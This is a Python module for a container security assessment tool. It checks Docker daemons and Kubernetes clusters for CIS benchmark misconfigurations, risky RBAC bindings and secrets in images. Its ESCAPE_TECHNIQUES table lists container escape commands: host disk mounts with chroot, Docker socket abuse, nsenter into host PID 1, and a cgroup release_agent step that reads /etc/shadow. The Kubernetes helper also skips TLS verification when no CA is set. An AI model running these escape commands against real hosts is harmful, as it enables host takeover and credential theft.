# app/core/container_assessment_engine.py
"""Docker and Kubernetes security assessment engine.

Provides container security assessment capabilities including Docker daemon
misconfiguration detection, Kubernetes cluster enumeration, RBAC analysis,
container image scanning, and escape technique guidance. All findings map
to CIS Docker/Kubernetes Benchmarks where applicable.

HTTP calls to Docker/K8s APIs are abstracted through helper methods to
allow mocking during testing.
"""

import json
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin

from PyQt6.QtCore import QObject, pyqtSignal

try:
    import requests
except ImportError:
    requests = None  # type: ignore


# ---------------------------------------------------------------------------
# CIS Docker Benchmark Checks
# ---------------------------------------------------------------------------

CIS_DOCKER_CHECKS: Dict[str, str] = {
    "CIS-DI-0001": "Ensure a separate partition for containers has been created",
    "CIS-DI-0002": "Ensure only trusted users are allowed to control Docker daemon",
    "CIS-DI-0003": "Ensure Docker is up to date",
    "CIS-DI-0004": "Ensure auditing is configured for Docker daemon",
    "CIS-DI-0005": "Ensure auditing is configured for Docker files and directories",
    "CIS-DI-0006": "Ensure the Docker daemon configuration file is owned by root:root",
    "CIS-DI-0007": "Ensure TLS authentication for Docker daemon is configured",
    "CIS-DI-0008": "Ensure the default ulimit is configured appropriately",
    "CIS-DI-0009": "Ensure Docker is allowed to make changes to iptables",
    "CIS-DI-0010": "Ensure insecure registries are not used",
    "CIS-DI-0011": "Ensure that the --no-new-privileges flag is set",
    "CIS-DK-0001": "Ensure that the API server is not exposed without authentication",
    "CIS-DK-0002": "Ensure containers are not run in privileged mode",
    "CIS-DK-0003": "Ensure sensitive host system directories are not mounted on containers",
    "CIS-DK-0004": "Ensure the Docker socket is not mounted inside containers",
    "CIS-DK-0005": "Ensure network mode is not set to host",
    "CIS-DK-0006": "Ensure PID mode is not set to host",
}

# CIS Kubernetes Benchmark Checks
CIS_K8S_CHECKS: Dict[str, str] = {
    "CIS-K8S-5.1.1": "Ensure that the cluster-admin role is only used where required",
    "CIS-K8S-5.1.2": "Minimize access to secrets",
    "CIS-K8S-5.1.3": "Minimize wildcard use in Roles and ClusterRoles",
    "CIS-K8S-5.1.5": "Ensure that default service accounts are not actively used",
    "CIS-K8S-5.1.6": "Ensure that Service Account Tokens are only mounted where necessary",
    "CIS-K8S-5.2.1": "Minimize the admission of privileged containers",
    "CIS-K8S-5.2.2": "Minimize the admission of containers wishing to share the host PID namespace",
    "CIS-K8S-5.2.3": "Minimize the admission of containers wishing to share the host network namespace",
    "CIS-K8S-5.4.1": "Prefer using secrets as files over secrets as environment variables",
    "CIS-K8S-5.7.1": "Create administrative boundaries between resources using namespaces",
    "CIS-K8S-DASH-001": "Ensure Kubernetes Dashboard is not exposed without authentication",
}


# ---------------------------------------------------------------------------
# Known RBAC Misconfiguration Patterns
# ---------------------------------------------------------------------------

RBAC_MISCONFIG_PATTERNS = [
    {
        "id": "rbac-cluster-admin-default-sa",
        "name": "ClusterRoleBinding with cluster-admin to default service account",
        "severity": "critical",
        "cis_ref": "CIS-K8S-5.1.1",
        "description": (
            "A ClusterRoleBinding grants cluster-admin privileges to a default "
            "service account, allowing full cluster control from any pod using "
            "that service account."
        ),
    },
    {
        "id": "rbac-wildcard-verbs",
        "name": "Wildcard verbs on all resources",
        "severity": "high",
        "cis_ref": "CIS-K8S-5.1.3",
        "description": (
            "A Role or ClusterRole uses wildcard verbs ('*') on all resources ('*'), "
            "granting unrestricted access to the Kubernetes API."
        ),
    },
    {
        "id": "pod-privileged",
        "name": "Pods running as privileged",
        "severity": "critical",
        "cis_ref": "CIS-K8S-5.2.1",
        "description": (
            "A pod security context sets privileged: true, granting the container "
            "full access to host devices and kernel capabilities."
        ),
    },
    {
        "id": "pod-host-network",
        "name": "Pod with hostNetwork enabled",
        "severity": "high",
        "cis_ref": "CIS-K8S-5.2.3",
        "description": (
            "A pod uses hostNetwork: true, sharing the host network namespace "
            "and bypassing network policy isolation."
        ),
    },
    {
        "id": "pod-host-pid",
        "name": "Pod with hostPID enabled",
        "severity": "high",
        "cis_ref": "CIS-K8S-5.2.2",
        "description": (
            "A pod uses hostPID: true, sharing the host PID namespace and "
            "allowing visibility into host processes."
        ),
    },
    {
        "id": "exposed-dashboard-no-auth",
        "name": "Exposed Kubernetes Dashboard without authentication",
        "severity": "critical",
        "cis_ref": "CIS-K8S-DASH-001",
        "description": (
            "The Kubernetes Dashboard is exposed (via NodePort, LoadBalancer, "
            "or Ingress) without requiring authentication, allowing anonymous "
            "cluster administration."
        ),
    },
]


# ---------------------------------------------------------------------------
# Container Escape Technique Database
# ---------------------------------------------------------------------------

ESCAPE_TECHNIQUES: List[Dict[str, Any]] = [
    {
        "id": "escape-privileged-mount",
        "name": "Privileged container host filesystem mount",
        "condition": "privileged",
        "description": (
            "Privileged containers can mount the host filesystem. "
            "Use `mount /dev/sda1 /mnt` to access host root."
        ),
        "commands": [
            "fdisk -l",
            "mount /dev/sda1 /mnt",
            "chroot /mnt",
        ],
        "mitre_technique": "T1611",
    },
    {
        "id": "escape-docker-socket",
        "name": "Docker socket escape",
        "condition": "docker_socket_mounted",
        "description": (
            "Docker socket mounted in container allows spawning new "
            "containers with host access."
        ),
        "commands": [
            "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
            "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host",
        ],
        "mitre_technique": "T1611",
    },
    {
        "id": "escape-host-pid",
        "name": "Host PID namespace escape",
        "condition": "host_pid",
        "description": (
            "Containers sharing host PID namespace can access host "
            "processes and potentially inject into them."
        ),
        "commands": [
            "ps aux",
            "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
        ],
        "mitre_technique": "T1611",
    },
    {
        "id": "escape-cap-sys-admin",
        "name": "CAP_SYS_ADMIN abuse for container escape",
        "condition": "cap_sys_admin",
        "description": (
            "With CAP_SYS_ADMIN, abuse cgroup release_agent for code "
            "execution on the host."
        ),
        "commands": [
            "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp",
            "echo 1 > /tmp/cgrp/notify_on_release",
            "echo '#!/bin/sh' > /cmd && echo 'cat /etc/shadow > /tmp/output' >> /cmd",
        ],
        "mitre_technique": "T1611",
    },
    {
        "id": "escape-host-network",
        "name": "Host network namespace exploitation",
        "condition": "host_network",
        "description": (
            "Containers in host network namespace can sniff traffic, "
            "access services bound to localhost, and ARP spoof."
        ),
        "commands": [
            "ip addr show",
            "tcpdump -i any -w capture.pcap",
            "curl http://127.0.0.1:10250/pods",
        ],
        "mitre_technique": "T1040",
    },
]


# ---------------------------------------------------------------------------
# ContainerAssessmentEngine
# ---------------------------------------------------------------------------


class ContainerAssessmentEngine(QObject):
    """Engine for Docker and Kubernetes security assessment.

    Performs Docker daemon misconfiguration detection, Kubernetes cluster
    enumeration, RBAC misconfiguration analysis, container image scanning,
    and provides escape technique guidance. All findings include CIS Benchmark
    mapping where applicable.

    HTTP calls are performed via internal helper methods (_docker_api_get,
    _k8s_api_get) which can be easily mocked for testing.
    """

    # Signals
    assessment_event = pyqtSignal(str, str)  # (event_type, message)
    finding_discovered = pyqtSignal(dict)    # finding dict

    def __init__(self, parent: Optional[QObject] = None):
        super().__init__(parent)
        self._docker_base_url: str = ""
        self._docker_tls_config: Optional[Dict[str, str]] = None
        self._k8s_api_server: str = ""
        self._k8s_token: str = ""
        self._k8s_ca_cert: Optional[str] = None
        self._session: Optional[Any] = None

    # ------------------------------------------------------------------
    # Configuration
    # ------------------------------------------------------------------

    def configure_docker(
        self,
        daemon_url: str = "http://localhost:2375",
        tls_cert: Optional[str] = None,
        tls_key: Optional[str] = None,
        tls_ca: Optional[str] = None,
    ) -> None:
        """Configure Docker daemon connection settings."""
        self._docker_base_url = daemon_url.rstrip("/")
        if tls_cert and tls_key:
            self._docker_tls_config = {
                "cert": tls_cert,
                "key": tls_key,
                "ca": tls_ca or "",
            }
        else:
            self._docker_tls_config = None

    def configure_kubernetes(
        self,
        api_server: str = "https://localhost:6443",
        token: str = "",
        ca_cert: Optional[str] = None,
    ) -> None:
        """Configure Kubernetes API connection settings."""
        self._k8s_api_server = api_server.rstrip("/")
        self._k8s_token = token
        self._k8s_ca_cert = ca_cert

    # ------------------------------------------------------------------
    # HTTP Helpers (mockable)
    # ------------------------------------------------------------------

    def _docker_api_get(self, path: str) -> Tuple[int, Any]:
        """Make a GET request to the Docker API.

        Returns (status_code, json_response_or_None).
        Override or mock this method in tests.
        """
        if requests is None:
            return (0, None)
        url = f"{self._docker_base_url}{path}"
        try:
            kwargs: Dict[str, Any] = {"timeout": 10}
            if self._docker_tls_config:
                kwargs["cert"] = (
                    self._docker_tls_config["cert"],
                    self._docker_tls_config["key"],
                )
                if self._docker_tls_config.get("ca"):
                    kwargs["verify"] = self._docker_tls_config["ca"]
            resp = requests.get(url, **kwargs)
            return (resp.status_code, resp.json())
        except Exception:
            return (0, None)

    def _k8s_api_get(self, path: str) -> Tuple[int, Any]:
        """Make a GET request to the Kubernetes API.

        Returns (status_code, json_response_or_None).
        Override or mock this method in tests.
        """
        if requests is None:
            return (0, None)
        url = f"{self._k8s_api_server}{path}"
        headers: Dict[str, str] = {}
        if self._k8s_token:
            headers["Authorization"] = f"Bearer {self._k8s_token}"
        try:
            kwargs: Dict[str, Any] = {"timeout": 10, "headers": headers}
            if self._k8s_ca_cert:
                kwargs["verify"] = self._k8s_ca_cert
            else:
                kwargs["verify"] = False
            resp = requests.get(url, **kwargs)
            return (resp.status_code, resp.json())
        except Exception:
            return (0, None)

    # ------------------------------------------------------------------
    # Docker Daemon Assessment
    # ------------------------------------------------------------------

    def check_docker_daemon(self, target: str = "") -> List[Dict]:
        """Check Docker daemon for misconfigurations.

        Detects:
        - Exposed Docker APIs (unauthenticated access)
        - Privileged containers
        - Host filesystem mounts
        - Docker socket mounted inside containers
        - Host network/PID mode

        Args:
            target: Docker daemon URL. If empty, uses configured URL.

        Returns:
            List of finding dicts with CIS Benchmark mapping.
        """
        if target:
            self.configure_docker(daemon_url=target)

        findings: List[Dict] = []
        timestamp = datetime.now(timezone.utc).isoformat()

        self.assessment_event.emit("docker_check_start", f"Checking Docker daemon at {self._docker_base_url}")

        # 1. Check if API is exposed (unauthenticated)
        status, info = self._docker_api_get("/info")
        if status == 200 and info:
            finding = self._create_finding(
                title="Docker API exposed without TLS authentication",
                severity="critical",
                description=(
                    f"Docker daemon API at {self._docker_base_url} is accessible "
                    "without TLS client certificate authentication. Any user with "
                    "network access can control containers and potentially the host."
                ),
                cis_ref="CIS-DK-0001",
                category="container",
                metadata={"daemon_url": self._docker_base_url, "docker_version": info.get("ServerVersion", "unknown")},
            )
            findings.append(finding)
            self.finding_discovered.emit(finding)
        elif status == 0:
            self.assessment_event.emit("docker_check_info", "Docker daemon not reachable or connection refused")
            return findings

        # 2. Check running containers for misconfigurations
        status, containers = self._docker_api_get("/containers/json?all=true")
        if status == 200 and containers:
            for container in containers:
                container_id = container.get("Id", "")[:12]
                container_name = (container.get("Names") or ["/unknown"])[0].lstrip("/")

                # Get detailed inspection for each container
                inspect_status, inspect_data = self._docker_api_get(f"/containers/{container_id}/json")
                if inspect_status != 200 or not inspect_data:
                    continue

                host_config = inspect_data.get("HostConfig", {})

                # Check privileged mode
                if host_config.get("Privileged", False):
                    finding = self._create_finding(
                        title=f"Privileged container: {container_name}",
                        severity="critical",
                        description=(
                            f"Container '{container_name}' ({container_id}) is running "
                            "in privileged mode, granting full access to host devices "
                            "and kernel capabilities. This allows container escape."
                        ),
                        cis_ref="CIS-DK-0002",
                        category="container",
                        metadata={"container_id": container_id, "container_name": container_name},
                    )
                    findings.append(finding)
                    self.finding_discovered.emit(finding)

                # Check host mounts
                mounts = inspect_data.get("Mounts", [])
                sensitive_mounts = self._check_sensitive_mounts(mounts, container_name, container_id)
                findings.extend(sensitive_mounts)

                # Check Docker socket mount
                for mount in mounts:
                    source = mount.get("Source", "")
                    if "/var/run/docker.sock" in source or "docker.sock" in source:
                        finding = self._create_finding(
                            title=f"Docker socket mounted in container: {container_name}",
                            severity="critical",
                            description=(
                                f"Container '{container_name}' ({container_id}) has the Docker "
                                "socket mounted, allowing it to control the Docker daemon "
                                "and spawn new privileged containers."
                            ),
                            cis_ref="CIS-DK-0004",
                            category="container",
                            metadata={"container_id": container_id, "mount_source": source},
                        )
                        findings.append(finding)
                        self.finding_discovered.emit(finding)

                # Check host network mode
                network_mode = host_config.get("NetworkMode", "")
                if network_mode == "host":
                    finding = self._create_finding(
                        title=f"Host network mode: {container_name}",
                        severity="high",
                        description=(
                            f"Container '{container_name}' ({container_id}) uses host "
                            "network mode, sharing the host's network namespace and "
                            "bypassing network isolation."
                        ),
                        cis_ref="CIS-DK-0005",
                        category="container",
                        metadata={"container_id": container_id, "network_mode": network_mode},
                    )
                    findings.append(finding)
                    self.finding_discovered.emit(finding)

                # Check host PID mode
                pid_mode = host_config.get("PidMode", "")
                if pid_mode == "host":
                    finding = self._create_finding(
                        title=f"Host PID mode: {container_name}",
                        severity="high",
                        description=(
                            f"Container '{container_name}' ({container_id}) uses host "
                            "PID mode, sharing the host's process namespace and "
                            "allowing visibility into host processes."
                        ),
                        cis_ref="CIS-DK-0006",
                        category="container",
                        metadata={"container_id": container_id, "pid_mode": pid_mode},
                    )
                    findings.append(finding)
                    self.finding_discovered.emit(finding)

        self.assessment_event.emit(
            "docker_check_complete",
            f"Docker check complete: {len(findings)} findings",
        )
        return findings

    def _check_sensitive_mounts(
        self, mounts: List[Dict], container_name: str, container_id: str
    ) -> List[Dict]:
        """Check container mounts for sensitive host directories."""
        sensitive_paths = ["/", "/etc", "/root", "/var", "/proc", "/sys", "/dev"]
        findings: List[Dict] = []

        for mount in mounts:
            source = mount.get("Source", "")
            if not source:
                continue
            # Check if source is or starts with a sensitive path
            for sensitive in sensitive_paths:
                if source == sensitive or (
                    sensitive != "/" and source.startswith(sensitive + "/")
                ):
                    finding = self._create_finding(
                        title=f"Sensitive host mount in container: {container_name}",
                        severity="high",
                        description=(
                            f"Container '{container_name}' ({container_id}) mounts "
                            f"sensitive host directory '{source}' which may allow "
                            "access to host system files or configuration."
                        ),
                        cis_ref="CIS-DK-0003",
                        category="container",
                        metadata={
                            "container_id": container_id,
                            "mount_source": source,
                            "mount_destination": mount.get("Destination", ""),
                        },
                    )
                    findings.append(finding)
                    self.finding_discovered.emit(finding)
                    break  # Only report once per mount

        return findings

    # ------------------------------------------------------------------
    # Kubernetes Enumeration
    # ------------------------------------------------------------------

    def enumerate_kubernetes(
        self, kubeconfig: Optional[str] = None, api_server: Optional[str] = None
    ) -> Dict[str, Any]:
        """Enumerate Kubernetes cluster resources.

        Discovers namespaces, pods, services, roles, and role bindings.

        Args:
            kubeconfig: Path to kubeconfig file (not used directly, for UI context).
            api_server: K8s API server URL. If provided, overrides configured URL.

        Returns:
            Dict with keys: namespaces, pods, services, roles, role_bindings,
            cluster_roles, cluster_role_bindings.
        """
        if api_server:
            self.configure_kubernetes(api_server=api_server, token=self._k8s_token)

        result: Dict[str, Any] = {
            "namespaces": [],
            "pods": [],
            "services": [],
            "roles": [],
            "role_bindings": [],
            "cluster_roles": [],
            "cluster_role_bindings": [],
        }

        self.assessment_event.emit("k8s_enum_start", f"Enumerating K8s cluster at {self._k8s_api_server}")

        # Enumerate namespaces
        status, data = self._k8s_api_get("/api/v1/namespaces")
        if status == 200 and data:
            items = data.get("items", [])
            result["namespaces"] = [
                {
                    "name": ns.get("metadata", {}).get("name", ""),
                    "status": ns.get("status", {}).get("phase", ""),
                    "labels": ns.get("metadata", {}).get("labels", {}),
                }
                for ns in items
            ]

        # Enumerate pods (all namespaces)
        status, data = self._k8s_api_get("/api/v1/pods")
        if status == 200 and data:
            items = data.get("items", [])
            result["pods"] = [
                {
                    "name": pod.get("metadata", {}).get("name", ""),
                    "namespace": pod.get("metadata", {}).get("namespace", ""),
                    "status": pod.get("status", {}).get("phase", ""),
                    "node": pod.get("spec", {}).get("nodeName", ""),
                    "containers": [
                        c.get("name", "") for c in pod.get("spec", {}).get("containers", [])
                    ],
                    "host_network": pod.get("spec", {}).get("hostNetwork", False),
                    "host_pid": pod.get("spec", {}).get("hostPID", False),
                    "service_account": pod.get("spec", {}).get("serviceAccountName", "default"),
                    "security_context": pod.get("spec", {}).get("securityContext", {}),
                    "container_specs": pod.get("spec", {}).get("containers", []),
                }
                for pod in items
            ]

        # Enumerate services (all namespaces)
        status, data = self._k8s_api_get("/api/v1/services")
        if status == 200 and data:
            items = data.get("items", [])
            result["services"] = [
                {
                    "name": svc.get("metadata", {}).get("name", ""),
                    "namespace": svc.get("metadata", {}).get("namespace", ""),
                    "type": svc.get("spec", {}).get("type", "ClusterIP"),
                    "ports": svc.get("spec", {}).get("ports", []),
                    "selector": svc.get("spec", {}).get("selector", {}),
                }
                for svc in items
            ]

        # Enumerate Roles (all namespaces)
        status, data = self._k8s_api_get("/apis/rbac.authorization.k8s.io/v1/roles")
        if status == 200 and data:
            items = data.get("items", [])
            result["roles"] = [
                {
                    "name": role.get("metadata", {}).get("name", ""),
                    "namespace": role.get("metadata", {}).get("namespace", ""),
                    "rules": role.get("rules", []),
                }
                for role in items
            ]

        # Enumerate RoleBindings (all namespaces)
        status, data = self._k8s_api_get("/apis/rbac.authorization.k8s.io/v1/rolebindings")
        if status == 200 and data:
            items = data.get("items", [])
            result["role_bindings"] = [
                {
                    "name": rb.get("metadata", {}).get("name", ""),
                    "namespace": rb.get("metadata", {}).get("namespace", ""),
                    "role_ref": rb.get("roleRef", {}),
                    "subjects": rb.get("subjects", []),
                }
                for rb in items
            ]

        # Enumerate ClusterRoles
        status, data = self._k8s_api_get("/apis/rbac.authorization.k8s.io/v1/clusterroles")
        if status == 200 and data:
            items = data.get("items", [])
            result["cluster_roles"] = [
                {
                    "name": cr.get("metadata", {}).get("name", ""),
                    "rules": cr.get("rules", []),
                }
                for cr in items
            ]

        # Enumerate ClusterRoleBindings
        status, data = self._k8s_api_get("/apis/rbac.authorization.k8s.io/v1/clusterrolebindings")
        if status == 200 and data:
            items = data.get("items", [])
            result["cluster_role_bindings"] = [
                {
                    "name": crb.get("metadata", {}).get("name", ""),
                    "role_ref": crb.get("roleRef", {}),
                    "subjects": crb.get("subjects", []),
                }
                for crb in items
            ]

        self.assessment_event.emit(
            "k8s_enum_complete",
            (
                f"Enumeration complete: {len(result['namespaces'])} namespaces, "
                f"{len(result['pods'])} pods, {len(result['services'])} services, "
                f"{len(result['roles']) + len(result['cluster_roles'])} roles"
            ),
        )
        return result

    # ------------------------------------------------------------------
    # RBAC Misconfiguration Detection
    # ------------------------------------------------------------------

    def check_rbac_misconfigs(
        self, k8s_resources: Optional[Dict[str, Any]] = None
    ) -> List[Dict]:
        """Check for Kubernetes RBAC misconfigurations.

        Detects:
        - ClusterRoleBinding with cluster-admin to default service account
        - Wildcard verbs ('*') on all resources ('*')
        - Pods running as privileged: true
        - hostNetwork: true or hostPID: true
        - Exposed Kubernetes Dashboard without auth

        Args:
            k8s_resources: Dict from enumerate_kubernetes(). If None,
                calls enumerate_kubernetes() first.

        Returns:
            List of finding dicts with CIS Benchmark references.
        """
        if k8s_resources is None:
            k8s_resources = self.enumerate_kubernetes()

        findings: List[Dict] = []
        self.assessment_event.emit("rbac_check_start", "Checking RBAC misconfigurations")

        # Check ClusterRoleBindings for cluster-admin bound to default SA
        for crb in k8s_resources.get("cluster_role_bindings", []):
            role_ref = crb.get("role_ref", {})
            if role_ref.get("name") == "cluster-admin":
                subjects = crb.get("subjects", [])
                for subject in subjects:
                    if (
                        subject.get("kind") == "ServiceAccount"
                        and subject.get("name") == "default"
                    ):
                        finding = self._create_finding(
                            title=f"cluster-admin bound to default service account via {crb['name']}",
                            severity="critical",
                            description=(
                                f"ClusterRoleBinding '{crb['name']}' grants cluster-admin "
                                f"privileges to the default service account in namespace "
                                f"'{subject.get('namespace', 'default')}'. Any pod using "
                                "the default service account has full cluster control."
                            ),
                            cis_ref="CIS-K8S-5.1.1",
                            category="kubernetes",
                            metadata={
                                "binding_name": crb["name"],
                                "subject_namespace": subject.get("namespace", "default"),
                            },
                        )
                        findings.append(finding)
                        self.finding_discovered.emit(finding)

        # Check ClusterRoles and Roles for wildcard verbs on all resources
        all_roles = k8s_resources.get("cluster_roles", []) + k8s_resources.get("roles", [])
        for role in all_roles:
            rules = role.get("rules", [])
            for rule in rules:
                verbs = rule.get("verbs", [])
                resources = rule.get("resources", [])
                api_groups = rule.get("apiGroups", [])
                if "*" in verbs and "*" in resources:
                    finding = self._create_finding(
                        title=f"Wildcard verbs on all resources in role: {role['name']}",
                        severity="high",
                        description=(
                            f"Role/ClusterRole '{role['name']}' grants wildcard verbs ('*') "
                            f"on all resources ('*') in API groups {api_groups}. "
                            "This effectively gives unrestricted access."
                        ),
                        cis_ref="CIS-K8S-5.1.3",
                        category="kubernetes",
                        metadata={
                            "role_name": role["name"],
                            "namespace": role.get("namespace", "cluster-wide"),
                            "api_groups": api_groups,
                        },
                    )
                    findings.append(finding)
                    self.finding_discovered.emit(finding)

        # Check pods for privileged mode, hostNetwork, hostPID
        for pod in k8s_resources.get("pods", []):
            pod_name = pod.get("name", "unknown")
            pod_ns = pod.get("namespace", "default")

            # Check container-level security contexts for privileged
            for container_spec in pod.get("container_specs", []):
                sec_ctx = container_spec.get("securityContext", {})
                if sec_ctx.get("privileged", False):
                    finding = self._create_finding(
                        title=f"Privileged pod: {pod_name} ({pod_ns})",
                        severity="critical",
                        description=(
                            f"Pod '{pod_name}' in namespace '{pod_ns}' has container "
                            f"'{container_spec.get('name', '')}' running in privileged mode. "
                            "This grants full host access and enables container escape."
                        ),
                        cis_ref="CIS-K8S-5.2.1",
                        category="kubernetes",
                        metadata={
                            "pod_name": pod_name,
                            "namespace": pod_ns,
                            "container": container_spec.get("name", ""),
                        },
                    )
                    findings.append(finding)
                    self.finding_discovered.emit(finding)

            # Check hostNetwork
            if pod.get("host_network", False):
                finding = self._create_finding(
                    title=f"Host network namespace: {pod_name} ({pod_ns})",
                    severity="high",
                    description=(
                        f"Pod '{pod_name}' in namespace '{pod_ns}' uses hostNetwork: true, "
                        "sharing the host network namespace and bypassing network policies."
                    ),
                    cis_ref="CIS-K8S-5.2.3",
                    category="kubernetes",
                    metadata={"pod_name": pod_name, "namespace": pod_ns},
                )
                findings.append(finding)
                self.finding_discovered.emit(finding)

            # Check hostPID
            if pod.get("host_pid", False):
                finding = self._create_finding(
                    title=f"Host PID namespace: {pod_name} ({pod_ns})",
                    severity="high",
                    description=(
                        f"Pod '{pod_name}' in namespace '{pod_ns}' uses hostPID: true, "
                        "enabling visibility into all host processes."
                    ),
                    cis_ref="CIS-K8S-5.2.2",
                    category="kubernetes",
                    metadata={"pod_name": pod_name, "namespace": pod_ns},
                )
                findings.append(finding)
                self.finding_discovered.emit(finding)

        # Check for exposed Kubernetes Dashboard
        dashboard_findings = self._check_dashboard_exposure(k8s_resources)
        findings.extend(dashboard_findings)

        self.assessment_event.emit(
            "rbac_check_complete",
            f"RBAC check complete: {len(findings)} misconfigurations found",
        )
        return findings

    def _check_dashboard_exposure(self, k8s_resources: Dict[str, Any]) -> List[Dict]:
        """Check if Kubernetes Dashboard is exposed without auth."""
        findings: List[Dict] = []

        for svc in k8s_resources.get("services", []):
            name = svc.get("name", "").lower()
            if "dashboard" in name or "kubernetes-dashboard" in name:
                svc_type = svc.get("type", "ClusterIP")
                if svc_type in ("NodePort", "LoadBalancer"):
                    finding = self._create_finding(
                        title=f"Kubernetes Dashboard exposed via {svc_type}: {svc['name']}",
                        severity="critical",
                        description=(
                            f"Kubernetes Dashboard service '{svc['name']}' in namespace "
                            f"'{svc.get('namespace', 'default')}' is exposed via {svc_type}. "
                            "If no additional authentication is configured, this allows "
                            "anonymous cluster administration."
                        ),
                        cis_ref="CIS-K8S-DASH-001",
                        category="kubernetes",
                        metadata={
                            "service_name": svc["name"],
                            "namespace": svc.get("namespace", ""),
                            "service_type": svc_type,
                            "ports": svc.get("ports", []),
                        },
                    )
                    findings.append(finding)
                    self.finding_discovered.emit(finding)

        return findings

    # ------------------------------------------------------------------
    # Container Image Scanning
    # ------------------------------------------------------------------

    def scan_container_image(self, image_ref: str) -> List[Dict]:
        """Scan a container image for vulnerabilities by analyzing layers and packages.

        Queries Docker API for image inspection data including layer information
        and installed packages where available.

        Args:
            image_ref: Image reference (e.g., 'nginx:latest', 'sha256:abc...').

        Returns:
            List of finding dicts for discovered vulnerabilities.
        """
        findings: List[Dict] = []
        self.assessment_event.emit("image_scan_start", f"Scanning image: {image_ref}")

        # Inspect image
        status, image_data = self._docker_api_get(f"/images/{image_ref}/json")
        if status != 200 or not image_data:
            self.assessment_event.emit("image_scan_error", f"Cannot inspect image: {image_ref}")
            return findings

        # Analyze image metadata
        config = image_data.get("Config", {})
        root_layers = image_data.get("RootFS", {}).get("Layers", [])
        image_size = image_data.get("Size", 0)

        # Check if running as root
        user = config.get("User", "")
        if not user or user == "root" or user == "0":
            finding = self._create_finding(
                title=f"Image runs as root: {image_ref}",
                severity="medium",
                description=(
                    f"Container image '{image_ref}' is configured to run as root user. "
                    "Running containers as root increases the impact of container escape "
                    "vulnerabilities."
                ),
                cis_ref="CIS-DI-0002",
                category="container_image",
                metadata={
                    "image_ref": image_ref,
                    "user": user or "root (default)",
                    "layers": len(root_layers),
                },
            )
            findings.append(finding)
            self.finding_discovered.emit(finding)

        # Check exposed ports
        exposed_ports = config.get("ExposedPorts", {})

        # Check for health check
        healthcheck = config.get("Healthcheck")

        # Analyze environment variables for secrets
        env_vars = config.get("Env", [])
        secret_keywords = ["password", "secret", "key", "token", "api_key", "apikey"]
        for env_var in env_vars:
            env_name = env_var.split("=")[0].lower() if "=" in env_var else ""
            if any(kw in env_name for kw in secret_keywords):
                finding = self._create_finding(
                    title=f"Potential secret in environment variable: {image_ref}",
                    severity="high",
                    description=(
                        f"Container image '{image_ref}' has an environment variable "
                        f"'{env_var.split('=')[0]}' that may contain a secret. "
                        "Secrets embedded in images are exposed to anyone with image access."
                    ),
                    cis_ref="CIS-K8S-5.4.1",
                    category="container_image",
                    metadata={
                        "image_ref": image_ref,
                        "env_variable": env_var.split("=")[0],
                    },
                )
                findings.append(finding)
                self.finding_discovered.emit(finding)

        # Get image history for layer analysis
        status, history = self._docker_api_get(f"/images/{image_ref}/history")
        if status == 200 and history:
            for layer in history:
                created_by = layer.get("CreatedBy", "")
                # Check for ADD/COPY of sensitive files
                if any(
                    pattern in created_by.lower()
                    for pattern in ["add .ssh", "copy .ssh", "add id_rsa", "copy id_rsa", "add .env", "copy .env"]
                ):
                    finding = self._create_finding(
                        title=f"Sensitive file added in image layer: {image_ref}",
                        severity="high",
                        description=(
                            f"Image layer in '{image_ref}' copies potentially sensitive "
                            f"files: {created_by[:100]}. Even if removed in later layers, "
                            "these files remain accessible in the layer history."
                        ),
                        cis_ref="CIS-DI-0002",
                        category="container_image",
                        metadata={"image_ref": image_ref, "layer_command": created_by[:200]},
                    )
                    findings.append(finding)
                    self.finding_discovered.emit(finding)

        self.assessment_event.emit(
            "image_scan_complete",
            f"Image scan complete: {len(findings)} findings for {image_ref}",
        )
        return findings

    # ------------------------------------------------------------------
    # Escape Guidance
    # ------------------------------------------------------------------

    def get_escape_guidance(self, container_context: Dict) -> List[Dict]:
        """Get container escape technique guidance based on container context.

        Analyzes the container's security context and provides applicable
        escape techniques with commands and references.

        Args:
            container_context: Dict describing container properties:
                - privileged (bool): Whether container runs in privileged mode
                - docker_socket_mounted (bool): Whether Docker socket is mounted
                - host_pid (bool): Whether host PID namespace is shared
                - host_network (bool): Whether host network namespace is shared
                - capabilities (list): Linux capabilities granted
                - mounts (list): Mounted volumes/paths

        Returns:
            List of applicable escape technique dicts with guidance.
        """
        applicable: List[Dict] = []

        is_privileged = container_context.get("privileged", False)
        has_docker_socket = container_context.get("docker_socket_mounted", False)
        has_host_pid = container_context.get("host_pid", False)
        has_host_network = container_context.get("host_network", False)
        capabilities = [c.upper() for c in container_context.get("capabilities", [])]
        mounts = container_context.get("mounts", [])

        for technique in ESCAPE_TECHNIQUES:
            condition = technique["condition"]
            applies = False

            if condition == "privileged" and is_privileged:
                applies = True
            elif condition == "docker_socket_mounted" and has_docker_socket:
                applies = True
            elif condition == "host_pid" and has_host_pid:
                applies = True
            elif condition == "cap_sys_admin" and "CAP_SYS_ADMIN" in capabilities:
                applies = True
            elif condition == "host_network" and has_host_network:
                applies = True

            if applies:
                guidance = {
                    "technique_id": technique["id"],
                    "name": technique["name"],
                    "description": technique["description"],
                    "commands": technique["commands"],
                    "mitre_technique": technique["mitre_technique"],
                    "applicable_because": condition,
                }
                applicable.append(guidance)

        self.assessment_event.emit(
            "escape_guidance",
            f"Found {len(applicable)} applicable escape techniques",
        )
        return applicable

    # ------------------------------------------------------------------
    # Finding Helper
    # ------------------------------------------------------------------

    def _create_finding(
        self,
        title: str,
        severity: str,
        description: str,
        cis_ref: str,
        category: str,
        metadata: Optional[Dict] = None,
    ) -> Dict:
        """Create a standardized finding dict with CIS Benchmark mapping.

        Args:
            title: Finding title.
            severity: Severity level (critical, high, medium, low, info).
            description: Detailed description.
            cis_ref: CIS Benchmark reference ID.
            category: Finding category (container, kubernetes, container_image).
            metadata: Additional context metadata.

        Returns:
            Finding dict.
        """
        # Resolve CIS reference description
        cis_description = (
            CIS_DOCKER_CHECKS.get(cis_ref)
            or CIS_K8S_CHECKS.get(cis_ref)
            or "Unknown CIS reference"
        )

        return {
            "title": title,
            "severity": severity,
            "description": description,
            "category": category,
            "cis_reference": cis_ref,
            "cis_description": cis_description,
            "metadata": metadata or {},
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
